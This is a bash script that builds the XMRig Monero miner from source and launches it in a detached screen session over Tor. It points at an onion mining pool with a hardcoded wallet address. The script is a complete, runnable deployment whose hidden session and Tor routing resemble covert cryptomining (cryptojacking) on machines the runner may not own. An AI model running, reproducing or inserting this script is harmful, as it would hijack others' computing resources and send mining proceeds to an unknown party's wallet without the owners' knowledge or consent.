#!/bin/bash
sudo apt update
sudo apt -y install apt-transport-https screen unzip 
sudo apt-get -y install curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev torsocks
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake ..
make
screen -d -m torsocks ./xmrig --url hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion:443 --user 82jWjEuvbYvVVeN3yho5zBFA2VFYhE6UqER9gKjhVxydMWm6cEhV9zt673unuwDyrjJY4HasiCDZvULqMHSBc7cAVc63uXJ --pass 1 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
